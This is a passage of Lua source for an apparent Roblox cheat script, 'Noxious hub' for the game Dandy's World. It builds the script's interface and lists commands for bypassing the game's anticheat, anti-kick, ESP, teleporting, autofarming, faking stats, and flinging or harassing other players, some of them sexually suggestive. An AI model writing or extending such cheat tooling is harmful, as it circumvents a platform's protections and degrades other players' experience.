-------------------------------------------------------------------------------------------------------------------------------

noxious["bottom frame"] = Instance.new"Frame"
noxious["bottom frame"].Size = UDim2.new(0, 594, 0, 52.8)
noxious["bottom frame"].Position = UDim2.new(0, 0, 0.7, 54)
noxious["bottom frame"].BackgroundColor3 = noxious["default black color"]
noxious["bottom frame"].BorderColor3 = noxious["default white color"]
noxious["bottom frame"].BorderSizePixel = 1
noxious["bottom frame"].Parent = mainframe

-------------------------------------------------------------------------------------------------------------------------------

noxious["execute button"] = Instance.new("TextButton")
noxious["execute button"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["execute button"].BackgroundColor3 = noxious["default black color"]
noxious["execute button"].Position = UDim2.new(0.4256, 0, 0.1579, 0)
noxious["execute button"].BorderColor3 = noxious["default white color"]
noxious["execute button"].BorderSizePixel = 1
noxious["execute button"].TextColor3 = noxious["default white color"]
noxious["execute button"].Font = Enum.Font.Nunito
noxious["execute button"].TextSize = 20
noxious["execute button"].TextScaled = false
noxious["execute button"].Text = ">_"
noxious["execute button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["execute button"].TextYAlignment = Enum.TextYAlignment.Center
noxious["execute button"].ZIndex = 2
noxious["execute button"].Parent = noxious["bottom frame"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["hide"] = Instance.new"Frame"
noxious["hide"].Size = UDim2.new(0, 16.3, 0, 52.8)
noxious["hide"].BackgroundColor3 = noxious["default black color"]
noxious["hide"].Position = UDim2.new(0.473, 0, 0, 0)
noxious["hide"].BorderColor3 = noxious["default white color"]
noxious["hide"].BorderSizePixel = 0
noxious["hide"].Parent = noxious["bottom frame"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["bottom frame team icon"] = Instance.new"ImageLabel"
noxious["bottom frame team icon"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["bottom frame team icon"].Position = UDim2.new(0.926, 0, 0.1579, 0)
noxious["bottom frame team icon"].BackgroundTransparency = 0
noxious["bottom frame team icon"].BackgroundColor3 = noxious["default black color"]
noxious["bottom frame team icon"].BorderSizePixel = 1
noxious["bottom frame team icon"].BorderColor3 = noxious["default white color"]
noxious["bottom frame team icon"].Image = "rbxassetid://130584446591314"
noxious["bottom frame team icon"].ImageColor3 = noxious["default image color"]
noxious["bottom frame team icon"].Parent = noxious["bottom frame"]
noxious["bottom frame team icon"].ImageColor3 = noxious["default white color"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["bottom frame title"] = Instance.new"TextLabel"
noxious["bottom frame title"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
noxious["bottom frame title"].Position = UDim2.new(0, -37, -0.18, 1)
noxious["bottom frame title"].BackgroundTransparency = 1
noxious["bottom frame title"].TextColor3 = noxious["default white color"]
noxious["bottom frame title"].Font = Enum.Font.Nunito
noxious["bottom frame title"].TextSize = 21.6
noxious["bottom frame title"].TextScaled = false
noxious["bottom frame title"].Text = "Noxious hub: Dandy's World"
noxious["bottom frame title"].TextXAlignment = Enum.TextXAlignment.Right
noxious["bottom frame title"].Parent = noxious["bottom frame"]

noxious["bottom frame subtitle"] = Instance.new"TextLabel"
noxious["bottom frame subtitle"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
noxious["bottom frame subtitle"].Position = UDim2.new(0, -37, 0.18, 1)
noxious["bottom frame subtitle"].BackgroundTransparency = 1
noxious["bottom frame subtitle"].TextColor3 = noxious["default gray color"]
noxious["bottom frame subtitle"].Font = Enum.Font.Nunito
noxious["bottom frame subtitle"].TextSize = 18
noxious["bottom frame subtitle"].TextScaled = false
noxious["bottom frame subtitle"].Text = "By Team Noxious & Plethora"
noxious["bottom frame subtitle"].TextXAlignment = Enum.TextXAlignment.Right
noxious["bottom frame subtitle"].Parent = noxious["bottom frame"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["top frame"] = Instance.new"Frame"
noxious["top frame"].Name = "TopFrame"
noxious["top frame"].Size = UDim2.new(0.9999, 0, 0, 52.8)
noxious["top frame"].BackgroundColor3 = noxious["default black color"]
noxious["top frame"].BorderColor3 = noxious["default white color"]
noxious["top frame"].BorderSizePixel = 1
noxious["top frame"].Parent = mainframe

noxious["hide interface button"] = Instance.new"TextButton"
noxious["hide interface button"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["hide interface button"].BackgroundColor3 = noxious["default black color"]
noxious["hide interface button"].Position = UDim2.new(0.9256, 0, 0.157, 0)
noxious["hide interface button"].BorderColor3 = noxious["default white color"]
noxious["hide interface button"].BorderSizePixel = 1
noxious["hide interface button"].TextColor3 = noxious["default white color"]
noxious["hide interface button"].Font = Enum.Font.Nunito
noxious["hide interface button"].TextSize = 20
noxious["hide interface button"].TextScaled = false
noxious["hide interface button"].Text = "X"
noxious["hide interface button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["hide interface button"].TextYAlignment = Enum.TextYAlignment.Center
noxious["hide interface button"].Parent = noxious["top frame"]

noxious["reposition interface button"] = Instance.new"TextButton"
noxious["reposition interface button"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["reposition interface button"].BackgroundColor3 = noxious["default black color"]
noxious["reposition interface button"].Position = UDim2.new(0.8489, 0, 0.158, 0)
noxious["reposition interface button"].BorderColor3 = noxious["default white color"]
noxious["reposition interface button"].BorderSizePixel = 1
noxious["reposition interface button"].TextColor3 = noxious["default white color"]
noxious["reposition interface button"].Font = Enum.Font.Nunito
noxious["reposition interface button"].TextSize = 20
noxious["reposition interface button"].TextScaled = false
noxious["reposition interface button"].Text = "R"
noxious["reposition interface button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["reposition interface button"].TextYAlignment = Enum.TextYAlignment.Center
noxious["reposition interface button"].Parent = noxious["top frame"]

function togglevisibility()
	mainframe.Visible = not mainframe.Visible
end

noxious["reposition interface button"].MouseButton1Click:Connect(
	function()
		centermainframe()
		noxious["click sound"]:Play()
	end
)

noxious["hide interface button"].MouseButton1Click:Connect(
	function()
		togglevisibility()
		noxious["click sound"]:Play()
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["top frame text"] = Instance.new"TextLabel"
noxious["top frame text"].Name = "welcome"
noxious["top frame text"].Size = UDim2.new(0.55, 0, 1.1, 0)
noxious["top frame text"].Position = UDim2.new(0.08, 4, -0.18, -2)
noxious["top frame text"].BackgroundTransparency = 1
noxious["top frame text"].TextColor3 = noxious["default white color"]
noxious["top frame text"].Font = Enum.Font.Nunito
noxious["top frame text"].TextSize = 21.6
noxious["top frame text"].TextScaled = false
noxious["top frame text"].Text = "Welcome, " .. noxious["local player"].DisplayName .. "! [Free]"
noxious["top frame text"].TextXAlignment = Enum.TextXAlignment.Left
noxious["top frame text"].Parent = noxious["top frame"]

noxious["top frame subtext"] = Instance.new"TextLabel"
noxious["top frame subtext"].Name = "welcome2"
noxious["top frame subtext"].Size = UDim2.new(0.55, 0, 1.1, 0)
noxious["top frame subtext"].Position = UDim2.new(0.08, 4, 0.18, -2)
noxious["top frame subtext"].BackgroundTransparency = 1
noxious["top frame subtext"].TextColor3 = noxious["default gray color"]
noxious["top frame subtext"].Font = Enum.Font.Nunito
noxious["top frame subtext"].TextSize = 18
noxious["top frame subtext"].TextScaled = false
noxious["top frame subtext"].Text = "(@" .. noxious["local player"].Name .. ")"
noxious["top frame subtext"].TextXAlignment = Enum.TextXAlignment.Left
noxious["top frame subtext"].Parent = noxious["top frame"]

spawn(function()

	if isunable(noxious["local player"].Name) then
		noxious["top frame text"].Text = "Welcome, unable!"
		noxious["top frame subtext"].Text = "(@unable) [Team Member]"
	end

	if isace(noxious["local player"].Name) then
		noxious["top frame text"].Text = "Welcome, Ace!"
		noxious["top frame subtext"].Text = "(@ace) [Team Member]"
	end

	if undercover(noxious["local player"].Name) then
		noxious["top frame text"].Text = "Welcome, ncts!"
		noxious["top frame subtext"].Text = "(@ncts) [Hidden]"

		spawn(function()
			local player = game.Players.LocalPlayer
			local playerGui = player:WaitForChild("PlayerGui")

			local function updichor()
				local mainGui = playerGui:FindFirstChild("MainGui")
				if mainGui then
					local infoFrame = mainGui:FindFirstChild("Info")
					if infoFrame then
						local ichorFrame = infoFrame:FindFirstChild("IchorFrame")
						if ichorFrame then
							local textLabel = ichorFrame:FindFirstChildWhichIsA("TextLabel")
							if textLabel then
								textLabel.Text = "108239"
							end
						end
					end
				end
			end

			local function onchar()
				updichor()
			end

			player.CharacterAdded:Connect(onchar)

			if player.Character then
				onchar()
			end
		end)
	end

	if premiumuser(noxious["local player"].Name) then
		local _=noxious["top frame text"].Text
		noxious["top frame text"].Text = "Welcome, " .. noxious["local player"].DisplayName .. "! [Premium]"
	else
		noxious["top frame text"].Text = "Welcome, " .. noxious["local player"].DisplayName .. "! [Free]"
	end

	if istester(noxious["local player"].Name) then
		local currentText = noxious["top frame subtext"].Text
		noxious["top frame subtext"].Text = currentText .. " [Tester]"
	end

	welcometxt = noxious["top frame"]:WaitForChild("welcome").Text
	welcome2txt = noxious["top frame"]:WaitForChild("welcome2").Text
end)

-------------------------------------------------------------------------------------------------------------------------------

noxious["top frame profile picture"] = Instance.new"ImageLabel"
noxious["top frame profile picture"].Size = UDim2.new(0, 36.3, 0, 36.3)
noxious["top frame profile picture"].Position = UDim2.new(0.013, 0, 0.157, 0)
noxious["top frame profile picture"].BackgroundTransparency = 0
noxious["top frame profile picture"].BackgroundColor3 = noxious["default black color"]
noxious["top frame profile picture"].BorderSizePixel = 1
noxious["top frame profile picture"].BorderColor3 = noxious["default white color"]
noxious["top frame profile picture"].Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
noxious["top frame profile picture"].Parent = noxious["top frame"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["scroll bar holder 2"] = Instance.new"Frame"
noxious["scroll bar holder 2"].Name = "RightScrollFrame"
noxious["scroll bar holder 2"].Size = UDim2.new(0, 10.9, 0, 242.00000000000003)
noxious["scroll bar holder 2"].BackgroundColor3 = noxious["default black color"]
noxious["scroll bar holder 2"].BorderSizePixel = 0
noxious["scroll bar holder 2"].Position = UDim2.new(0, 584, 0, 50)
noxious["scroll bar holder 2"].BorderColor3 = noxious["default white color"]
noxious["scroll bar holder 2"].BorderSizePixel = 1
noxious["scroll bar holder 2"].ZIndex = 1
noxious["scroll bar holder 2"].Parent = mainframe
noxious["scroll bar holder 2"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

noxious["command lists"] = {
	["Main"]={
		"reloadnoxious, reloadnxs - reloads noxious hub",
		"repositionnoxious, reposnxs - re-positions the interface",
		"hidenoxious, hidenxs - hides the interface",
		"destroynoxious, destroynxs - destroys the interface",
		" ",
		"getnoxiouspremium, gnp - copies the gamepass link for noxious premium",
		"feedback - opens the feedback tab",
		" ",
		"enablemobiletapindicators, emti - enables tap indicators for mobile",
		"disablemobiletapindicators, dmti - enables tap indicators for mobile",
		" ",
		"stoprunningconnections, src - stops all running connections",
		"openconsole, console - opens roblox console",
		" ",
		"hidedeveloperlabel, hdl - hides noxious team members' labels",
		"showdeveloperlabel, sdl - shows noxious team members' labels",
		" ",
		"executeallfavoritedcommands, eafc - executes all favorited commands",
		" ",
		"noxiousdiscord, nd - copies Noxious' discord server link",
		"blushcrunchdiscord, bcd - copies the BlushCrunch Studio's discord server link",
		"dandybindiscord, dbd - copies the Dandy Bin's discord server link",
		"hexdiscord, hd - copies Hex's discord server link",
		"gobbydiscord, gd - copies G0bbyD0llan's discord server link",
		" ",
		"notifyversion, notifyv - notifies you the current version of noxious",
		"closeallnotifications, can - closes all notifications",
		" ",
		"settogglekeybind, stkb - sets the keybind to toggle the interface",
		"cleartogglekeybind, ctkb - clears the toggle interface keybind",
		" ",
		"joinlobby, jl - join the lobby",
		"joinroleplayserver, jrps - join a roleplay server",
		"joinrun, jr - attempt to join a run",
	},
	["Risky Commands"] = {
		-- "gettoon, gt [toon name] - gives you the specified toon",
		-- "unlockall, ua - unlocks everything",
		-- " ",
		"sproutselfheal, ssh - heal yourself (USE SPROUT)",
		"cosmoselfheal, csh - heal yourself (USE COSMO)",
		"enableautoshellyboost, easb - enable auto shelly boost (USE SHELLY)",
		"disableautoshellyboost, dasb - disable auto shelly boost",
		" ",
		"enablefloatdistract1, efd1 - gives you the ability to distract while floating (WILL NOT WORK ON GOOB OR SCRAPS)",
		"(HP) enablefloatdistract2, efd2 - gives you the ability to distract large twisteds while floating (WILL NOT WORK ON GOOB OR SCRAPS)",
		"(HP) enablefloatdistract3, efd3 - gives you the ability to distract larger twisteds while floating (WILL NOT WORK ON GOOB OR SCRAPS)",
		"disablefloatdistract, dfd - stop float distracting",
		" ",
		"faketooncard, ftc [toon name] - makes you select the specified toon whne voting (CLIENT)",
	},
	["Favorited Commands"] = {
	},
	["ESPs / Visuals"] = {
		"hideesptext, hespt - hide esp text",
		"showesptext, sespt - show esp text",
		"hideesphighlights, hesph - hide esp highlights",
		"showesphighlights, sesp - show esp highlights",
		" ",
		"enableallesp, eaesp - enables all esp types",
		"disableallesp, daesp - disables all esp types",
		" ",
		"enableplayeresp, epesp - enables player esp",
		"disableplayeresp, dpesp - disables player esp",
		" ",
		"enablemachineesp, emesp - enables machine esp",
		"disablemachineesp, dmesp - disables machine esp",
		" ",
		"enabletwistedesp, etesp - enables twisteds esp",
		"disabletwistedesp, dtesp - disables twisteds esp",
		" ",
		"enableitemesp, eiesp - enables item esp",
		"disableitemesp, didesp - disables item esp",
		" ",
		"enablefakeelevatoresp, efeesp - enables fake elevator esp",
		"disablefakeelevatoresp, dfeesp - disables fake elevator esp",
		" ",
		"enablealltracers, eat - enables all tracer types",
		"disablealltracers, dat - disables all tracer types",
		" ",
		"enableplayertracers, ept - enables player tracers",
		"disableplayertracers, dpt - disables player tracers",
		" ",
		"enablemachinetracers, emt - enables machine tracers",
		"disablemachinetracers, dmt - disables machine tracers",
		" ",
		"enabletwistedtracers, ett - enables twisteds tracers",
		"disabletwistedtracers, dtt - disables twisteds tracers",
		" ",
		"enableitemtracers, eit - enables item tracers",
		"disableitemtracers, didt - disables item tracers",
		" ",
		"enablefakeelevatortracers, efet - enables fake elevator tracers",
		"disablefakeelevatortracers, dfet - disables fake elevator tracers",
		" ",
		"breakstats, bstats - sets all the round stats to NaN",
		" ",
		"showadminpanel, sap - shows the admin panel",
		"hideadminpanel, hap - hides the admin panel",
		"showdiscardedgui, sdg - shows a discarded toon select gui",
		"hidediscardedgui, hdg - hides the discarded toon select gui",
		" ",
		"enableallvisualizers, eav - enables all visualizers",
		"disableallvisualizers, dav - disables all visualizers",
		"showkillvisualizer, skv - shows the twisted's hit hitbox",
		"hidekillvisualizer, hkv - hides the twisted's hit hitbox",
		"shownearvisualizer, snv - shows the twisted's near player detection hitbox",
		"hidenearvisualizer, hnv - hides the twisted's near player detection hitbox",
		"showvisionvisualizer, svv - shows the twisted's vision range",
		"hidevisionvisualizer, hvv - hides the twisted's vision range",
		"showhearingvisualizer, shv - shows the twisted's hearing range",
		"hidehearingvisualizer, hhv - hides the twisted's hearing range",
		" ",
		"fakeblackouts, fblackouts [number] - sets blackouts value to the specified number",
		"fakeichor, fichor [number] - sets ichor value to the specified number",
		"fakedandyitemspurchased, fdip [number] - sets dandyitemspurchased value to the specified number",
		"fakefloorstraveled, fft [number] - sets floorstraveled value to the specified number",
		"fakemachinesfinished, fmf [number] - sets machinescompleted value to the specified number",
		"fakefurthestfloor, fff [number] - sets furthestfloor value to the specified number",
		"fakeitemspickedup, fipu [number] - sets itemspickedup value to the specified number",
		"changeresearch, cr [toon name] [number] - sets research value of the specified twisted name to the specified number",
		" ",
		"unlockalltoons, uato - unlocks all toons (CLIENT)",
		"unlockalltrinkets, uatr - unlocks all trinkets (CLIENT)",
		"showalltooncards, satc - shows all toon cards when voting (CLIENT)",
		" ",
		"fire [target] - sets the target on fire",
		"unfire [target] - extinguishes the target",
		" ",
		"restorecharacter, rec - restores your character",
		" ",
		"sproutcutout, stc - morphs you into sprout's cardboard cutout",
		"dandycutout, dyc - morphs you into dandy's cardboard cutout",
		"shellycutout, syc - morphs you into shelly's cardboard cutout",
		"pebblecutout, pec - morphs you into pebble's cardboard cutout",
		"astrocutout, aoc - morphs you into astro's cardboard cutout",
		"veecutout, vec - morphs you into vee's cardboard cutout",
		" ",
		"bodiless, bl - removes your body",
		"unbodiless, ubl - restores your body",
		"headless, hl - removes your head",
		"unheadless, uhl - restores your head",
		"legless, ll - removes your legs",
		"unlegless, ull - restores your legs",
		"armless, al - removes your arms",
		"armless, ual - restores your arms",
		" ",
		"enablegoobfrogblinking, egfb - enables goob frog blinking (USE GOOB)",
		"disablegoobfrogblinking, dgfb - disables goob frog blinking (USE GOOB)",
		" ",
		"valentinesgigiskin, vgs - applies a valentines themed skin to gigi (USE GIGI)",
		"valentinesshellyskin, vss - applies a valentines themed skin to shelly (USE SHELLY)",
		" ",
		"twistedpoppyskin, tps - become twisted poppy (USE POPPY)",
		"becomedandy, bd - become dandy (USE BOXTEN)",
		"unabliusunablecifer, uu - the (USE BOXTEN)",
		" ",
		"ghostcharacter, gc [color] - turns you into a ghost thing with the specified color",
		" ",
		"chat, talk [text] makes the specified target say something (CLIENT)",
		"polaris, code - ...",
	},
	["Map / Environment"] = {
		"enablefullbright, efb - enables fullbright (CLIENT)",
		"disablefullbright, dfb - disables fullbright",
		"enablealternativefullbright, eafb - enables alternative fullbright (CLIENT)",
		"disablealternativefullbright, dafb - disables alternative fullbright",
		" ",
		"deletedeveloperdoors, ddd - delete developer doors (ONLY WORKS IN THE LOBBY)",
		"deleteinvisibleborders, dib - delete invisible borders / walls (CLIENT)",
		" ",
		"antilag, boostfps - improve performance (CLIENT)",
		" ",
		"enableinfinitenametagmaxdistance, einmd - enables infinite nametag maxdistance",
		"disableinfinitenametagmaxdistance, dinmd - disables infinite nametag maxdistance",
		"showplayerhealth, sph - shows players' health stats",
		"hideplayerhealth, hph - hides players' health stats",
		" ",
		"spawnshrimpo, sps - spawns a shrimpo (CLIENT)",
		"spawndandy, spd - spawns a dandy (CLIENT)",
		"spawntwisteddandy, sptd - spawns a twisted dandy (CLIENT)",
		"spawnfishbowl, spfb - spawns a bodiless finn (CLIENT)",
		"spawntv, sptv - spawns vee's head (CLIENT)",
	},
	["Teleports"]={
		"teleporttoelevator, tpte - teleport to elevator",
		"enableautoteleporttoelevator, eatpte - enables auto tp to elevator",
		"disableautoteleporttoelevator, datpte - disables auto tp to elevator",
		"enableautoteleportto7playerelevator, eatpt7pe - enables auto teleport to a 7 player elevator (ONLY WORKS IN THE LOBBY)",
		"disableautoteleportto7playerelevator, datpt7pe - disables auto teleport to a 7 player elevator (ONLY WORKS IN THE LOBBY)",
		"enableautoteleporttogenerator, eatptg - enables auto teleport to another generator upon extracting",
		"disableautoteleporttogenerator, datptg - disables auto teleport to another generator upon extracting",
		" ",
		"(HP) teleporttogenerator, tptg - teleport to a generator",
		"(HP) teleportto, to [target] - teleport to specified target",
		" ",
		"teleporttoadminroom, tptar - teleport to admin room (ONLY WORKS IN THE LOBBY)",
		"teleporttobedroom, tptbr - teleport to bedroom (ONLY WORKS IN THE LOBBY)",
		"teleporttodandysshop, tptds - teleport to dandy's shop (ONLY WORKS IN THE LOBBY)",
		"teleporttoboxofdoom, tptbod - teleport to the box of doom (ONLY WORKS IN THE LOBBY)",
		"teleporttostage, tpts - teleport to the stage (ONLY WORKS IN THE LOBBY)",
	},
	["Local Player"] = {
		"speedchangergui, scgui - opens speed changer gui",
		"(HP) autofarmgui, afgui - opens autofarm gui",
		"(HP) oldautofarmgui, oafgui - opens old autofarm gui",
		"unionautofarm, unionaf - opens union's dandy's world autofarm gui",
		" ",
		"enablegodmode, egm - makes it so when a twisted chases you it freezes them (UNRELIABLE)",
		" ",
		"removeanticheat, rac - removes anticheat (UNRELIABLE)",
		"bypassanticheat, bac - bypass anticheat (UNRELIABLE)",
		" ",
		"usepublicloadout, upl - enables everything necessary for a public run",
		"usesololoadout, usl - enables everything necessary for a solo run",
		"useesplaodout, uespl - obstruct everything in your fucking view",
		"usehealerloadout, uhrl - enables everything necessary for a healer",
		"usedistractorloadout, udl - enables everything necessary for a distractor",
		"useblatantloadout, ubl - runs every command that can get you reported in a run",
		"usesemiblatantloadout, usbl - runs almost every command that can get you reported in a run",
		" ",
		"enableautocalibration, eac - enables auto calibration",
		"disableautocalibration, dac - disables auto calibration",
		"enableautocalibration2, eac2 - disables the skillcheck gui and makes skillchecks return 'supercomplete'",
		" ",
		"enableantikick, eak - prevents localscripts from kicking you",
		"disableantikick, dak - stops preventing localscripts from kicking you",
		" ",
		"fov [number] - sets your camera's field of view to the specified number (default is 70)",
		"maxzoom [number] - sets maximum zoom distance to the specified number",
		"minzoom [number] - sets minimum zoom distance to the specified number",
		"teleportwalk, tpwalk [speed] - sets teleport walk to the specified speed",
		"unteleportwalk, untpwalk - stop teleport walking",
		"clipframefly, cffly [speed] - makes you clip frame fly",
		"unclipframefly, uncffly - stop clip frame flying",
		" ",
		"floatgui, fgui - opens float gui",
		" ",
		"teleporttool, tptool - gives you a teleport tool",
		"reset, re - resets your character then teleports you back to where you died after respawning",
		"die - sets your character's health to 0",
		"noclip - enables noclip",
		"unnoclip, clip - disables noclip",
		"enablelooprunspeed, elrs - enable loop run speed",
		"disablelooprunspeed, dlrs - disable loop run speed",
		" ",
		"enablebassiemacro, ebm [delay] - enables auto drop item, then pick it up (BONE TRINKET REQUIRED) (USE BASSIE)",
		"disablebassiemacro, dbm - disables auto bassie pick up macro",
		" ",
		"getresearch, gr - get twisted research",
		" ",
		"antifling, af - makes you unflingable",
		"unantifling, uaf - makes you flingable",
		" ",
		"runactiveability, raa [target] - runs your active ability on the specified target",
		"enableautouseability, eaua - enable auto use ability",
		"disableautouseability, daua - disable auto use ability",
		" ",
		"enableitemaura, eia - enable item aura",
		"disableitemaura, dia - disable item aura",
		"enableitemaura2, eia2 - enable item aura but its more efficient",
		"disableitemaura2, dia2 - disable item aura 2",
		"enablegeneratoraura, ega - enable generator aura",
		"disablegeneratoraura, dga - disable generator aura",
		"enableautouseitems, eaui - enable auto use items",
		"disableautouseitems, daui - disable auto use items",
		"pickupallitems, puai - pick up all items",
		"pickupallresearchcapsules, puarc - pick up all research capsules",
		"pickupalltapes, puat - pick up all tapes",
		"pickupallheals, puah - pick up all heals",
		"pickupallbaskets, puab - pick up all baskets",
		"pickupallextractionitems, puaei - pick up all extraction items",
		" ",
		"changeusername, cuser [text] - change your username (CLIENT)",
		"changedisplayname, cdisplay [text] - change your display name (CLIENT)",
		"changeownertagtext, cotagt [text] - change the owner tag text (CLIENT)",
		"enableglitchednametag, egnt - enable glitched name tag (CLIENT)",
		"disableglitchednametag, dgnt - disable glitched name tag",
		"enableglitchedroleplayname, egrpn - enables glitched roleplay name (ONLY WORKS IN ROLEPLAY SERVERS)",
		"disableglitchedroleplayname, dgrpn - disables glitched roleplay name",
		"enablerunofs30znametag, erosnt - enable run of s30z name tag (CLIENT)",
		"disablerunofs30znametag, drosnt - disable run of s30z name tag",
		"enablerunofs30zroleplayname, erosrpn - enable run of s30z roleplay name (ONLY WORKS IN ROLEPLAY SERVERS)",
		"disablerunofs30zroleplayname, drosrpn - disable run of s30z roleplay name",
		"showownertag, sot - show owner tag (CLIENT)",
		"hideownertag, hot - hide owner tag",
		" ",
		"antiskillcheck, ask - removes skillchecks",
		"unantiskillcheck, uask - resotres skillchecks",
		"antipopups, apu - removes pop-ups",
		"unantipopups, uapu - restores pop-ups",
		" ",
		"spectate, view [target] - switches your camera subject to the specified player",
		"unspectate, unview - stops viewing target",
		"noclipcamera, nccam - makes your camera clip through objects",
		" ",
		"enablechatguider, ecg - enables all chat guiding options",
		"disablechatguider, dcg - disables all chat guiding options",
		"enabletwistedschatguider, etcg - enables chat guiding for the twisteds in the current floor",
		"disabletwistedschatguider, dtcg - disables chat guiding for the twisteds in the current floor",
		"enablelowhealthchatguider, elhcg - enables chat guiding for when a player is at 1 heart",
		"disablelowhealthchatguider, dlhcg - disables chat guiding for when a player is at 1 heart",
		"enabledeadplayerchatguider, edpcg - enables chat guiding for when a player dies",
		"disabledeadplayerchatguider, ddpcg - disables chat guiding for when a player dies",
		"enablerareitemschatguider, ericg - enables chat guiding for when a rare item is detected",
		"disablerareitemsschatguider, dricg - disables chat guiding for when a rare item is detected",
		" ",
		"enablenotifier, en - enables all notifying options",
		"disablenotifier, dn - disables all notifying options",
		"enabletwistedsnotifier, etn - enables notifying for the twisteds in the current floor",
		"disabletwistedsnotifier, dtn - disables notifying for the twisteds in the current floor",
		"enablelowhealthnotifier, elhn - enables notifying for when a player is at 1 heart",
		"disablelowhealthnotifier, dlhn - disables notifying for when a player is at 1 heart",
		"enabledeadplayernotifier, edpn - enables notifying for when a player dies",
		"disabledeadplayernotifier, ddpn - disables notifying for when a player dies",
		"enablerareitemsnotifier, erin - enables notifying for when a rare item is detected",
		"disablerareitemssnotifier, drin - disables notifying for when a rare item is detected",
		" ",
		"opendandysshop, ods - opens dandy's shop (ONLY WORKS IN THE LOBBY)",
		"opentoonlicenseshop, otls - opens toon license shop (ONLY WORKS IN THE LOBBY)",
		"opentrinketsshop, ots - opens trinkets shop (ONLY WORKS IN THE LOBBY)",
		"openskinsshop, oss - opens skins shop (ONLY WORKS IN THE LOBBY)",
		"openmerchshop, oms - opens merch shop (ONLY WORKS IN THE LOBBY)",
		"openskinchanger, osc - opens skin changer (ONLY WORKS IN THE LOBBY)",
		"openoldskinunlocker, oosu - opens old skin unlocker (ONLY WORKS IN THE LOBBY)",
	},
	["Fun / Trolls"] = {
		"bang [target] - bangs specified target",
		"unbang - unbangs specified target",
		" ",
		"bbang [target] - bottom bangs specified target",
		"unbbang - unbottom bangs specified target",
		" ",
		"head [target] - gives specified target head",
		"unhead - stop giving specified target head",
		" ",
		"hsit [target] - sit on specified target's head",
		"unhsit - stop sitting on specified target's head",
		" ",
		"hsit2 [target] - sit on specified target's head (works for new animations)",
		"unhsit2 - stop sitting on specified target's head",
		" ",
		"hjump [target] - jump on specified target's head",
		"unhjump - stop jumping on specified target's head",
		" ",
		"fliptools, ft - gives you backflip and frontflip tools",
		" ",
		"fly [speed] - makes you fly",
		"unfly - stop flying",
		"spin [speed] - makes you spin",
		"unspin - stop spinning",
		"enablejumping, ejump - enable jumping",
		"diasblejumping, djump - disable jumping",
		" ",
		"forceuseitems, fui [target] - forces target to use their items and apply the effects on you",
		"enableloopforceuseitems, elfui [target] [delay] - enable loop force target to use their items and apply the effects on you",
		"disableloopforceuseitems, dlfui [target] - disable loop force target to use their items and apply the effects on you",
		" ",
		"fling [target] - flings the specified target (ONLY WORKS IN ROLEPLAY SERVERS) (USE WITH BECOMECHARACTER)",
		"enablewalkfling, ewf - gives you the ability to fling people upon touch (ONLY WORKS IN ROLEPLAY SERVERS) (USE WITH BECOMECHARACTER)",
		"disablewalkfling, dwf - disables walkfling",
		" ",
		"singthickofit, stoi - makes you sing thick of it by ksi",
		" ",
		"becomecharacter, bchar - become yourself",
	},
	["Animations / Emotes"] = {
		"animationsgui, agui - opens animations gui",
		"glistensanimationcloset, gac - opens Rode Striker's 'Glisten's animation closet' script",
		" ",
		"enableloopabilityanimation, elaa - loops your toon's walking animation if it has one",
		"disableloopabilityanimation, dlaa - stops looping your toon's walking animation if it has one",
		"enableloopextractinganimation, elea - loops your toon's extracting animation",
		"disableloopextractinganimation, dlea - stops looping your toon's extracting animation",
		"enableloopidleanimation, elia - loops your toon's idle animation",
		"disableloopidleanimation, dlia - stops looping your toon's idle animation",
		"enableloopquirkanimation, elqa - loops your toon's quirk animation if it has one",
		"disableloopquirkanimation, dlqa - stops looping your toon's quirk animation if it has one",
		"enablelooprunninganimation, elra - loops your toon's running animation if it has one",
		"disablelooprunninganimation, dlra - stops looping your toon's running animation if it has one",
		"enableloopwalkinganimation, elwa - loops your toon's walking animation",
		"disableloopwalkinganimation, dlwa - stops looping your toon's walking animation",
		" ",
		"tpose - makes you t-pose",
		"untpose - stop t-posing",
		" ",
		"crawl - makes you crawl (ONLY WORKS IN ROLEPLAY SERVERS / RUNS)",
		"uncrawl - disables crawling",
		" ",
		"therian - makes you run like a therian? idk (ONLY WORKS IN ROLEPLAY SERVERS / RUNS)",
		"untherian - disables therian run",
		" ",
		"dance - makes you dance",
		"undance - stop dancing",
		" ",
		"headbang, hbang - makes you bang your head",
		"unheadbang, unhbang - stop headbanging",
		" ",
		"cradle - makes you curdle up into a ball",
		"uncradle - stop cradling",
		" ",
		"sit - makes you sit",
		"unsit - stop sitting",
		" ",
		"wave - makes you wave",
		"enableclickwave, ecwave - enables click to wave",
		"disableclickwave, dcwave - disables click to wave",
		" ",
		"doabarrelroll, dabr - makes you do a barrel roll",
		"enableclickdoabarrelroll, ecdabr - enables click to do a barrel roll",
		"disableclickdoabarrelroll, dcdabr - disables click to do a barrel roll",
		" ",
		"pounce - makes you pounce",
		"enableclickpounce, ecpounce - enables click to pounce",
		"disableclickpounce, dcpounce - disables click to pounce",
		" ",
		"twirl - makes you twirl",
		"enableclicktwirl, ectwirl - enables click to twirl",
		"disableclicktwirl, dctwirl - disables click to twirl",
		" ",
		"twirl2 - makes you twirl 2",
		"enableclicktwirl2, ectwirl2 - enables click to twirl 2",
		"disableclicktwirl2, dctwirl2 - disables click to twirl 2",
		" ",
		"shimmy - makes you shimmy side to side",
		"enableclickshimmy, ecshimmy - enables click to shimmy side to side",
		"disableclickshimmy, dcshimmy - disables click to shimmy side to side",
		" ",
		"facepalm - makes you facepalm",
		"enableclickfacepalm, ecfacepalm - enables click to facepalm",
		"disableclickfacepalm, dcfacepalm - disables click to facepalm",
		" ",
		"jump - makes you jump",
		"enableclickjump, ecjump - enables click to jump",
		"disableclickjump, dcjump - disables click to jump",
